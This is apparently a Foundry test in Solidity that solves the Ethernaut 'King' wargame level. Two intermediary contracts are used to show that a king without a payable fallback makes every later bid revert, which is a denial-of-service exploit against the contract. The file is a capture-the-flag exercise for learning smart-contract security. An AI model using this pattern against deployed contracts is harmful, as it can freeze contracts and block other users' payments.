// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/King.sol";

contract MiddleMan1 {
    function callKing(address king) public payable {
        king.call{value: msg.value}("");
    }

    fallback() external payable {}
}

contract MiddleMan2 {
    function callKing(address king) public payable {
        king.call{value: msg.value}("");
    }
}

contract KingTest is Test {
    King king;

    function setUp() public {
        vm.prank(msg.sender);
        king = new King{value: .001 ether}();
    }

    function test() public {
        assertEq(king.king(), msg.sender);

        MiddleMan1 middleMan1 = new MiddleMan1();
        MiddleMan2 middleMan2 = new MiddleMan2();

        // in practice, somehow needs to transfer > the original amount
        middleMan1.callKing{value: .001 ether}(address(king));
        assertEq(king.king(), address(middleMan1));

        // in practice, somehow needs to transfer > the previous amount
        middleMan2.callKing{value: .001 ether}(address(king));
        assertEq(king.king(), address(middleMan2));

        vm.expectRevert();
        address(king).call{value: .001 ether}("");
    }
}
